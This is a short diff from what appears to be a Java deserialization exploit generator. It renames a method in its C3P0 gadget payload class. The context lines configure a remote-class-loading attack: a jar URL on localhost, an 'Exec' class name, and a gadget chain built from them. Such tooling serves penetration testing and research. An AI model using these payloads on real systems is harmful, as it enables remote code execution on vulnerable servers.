@@ -46,7 +46,7 @@ public class C3P0 implements ObjectPayload<Object> {
         sinksHelper.setSink(C3P0.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.DEFAULT);
         sinksHelper.setUrl("http://127.0.0.1:1234/ClassLoad-1.0.jar");
-        sinksHelper.setRemoteClassName("org.example.Exec");
+        sinksHelper.setClassName("org.example.Exec");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         sinksHelper.setJavaClassHelper(javaClassHelper);
         PayloadRunner.run(C3P0.class, args, sinksHelper);
@@ -57,7 +57,7 @@ public class C3P0 implements ObjectPayload<Object> {
 //        Object sinkObject = SinkScheduler.builder(sinksHelper);
 
         String url = sinksHelper.getUrl();
-        String className = sinksHelper.getRemoteClassName();
+        String className = sinksHelper.getClassName();
 
         Object kickOffObject = getChain(url, className);
 
